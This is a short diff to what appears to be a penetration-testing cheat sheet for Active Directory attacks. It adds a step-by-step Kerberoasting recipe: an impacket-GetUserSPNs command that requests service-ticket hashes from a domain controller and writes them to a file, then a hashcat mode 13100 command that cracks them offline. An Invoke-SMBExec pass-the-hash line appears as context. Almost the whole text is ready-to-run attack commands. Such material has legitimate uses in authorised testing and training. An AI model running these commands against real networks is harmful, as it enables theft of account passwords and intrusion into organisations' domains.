@@ -117,9 +117,14 @@ Invoke-SMBExec -hash HASH -Target HOSTNAME -Domain DOMAIN -Username USERNAME -Co
 ```
 
 ### Kerberoast
-
+GetUserSPNs and get hashes :
 ```markdown
 impacket-GetUserSPNs -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast
+```
+
+Crack hashes :
+```markdown
+hashcat -m 13100 hashes.kerberoast wordlist -O
 ```
 
 
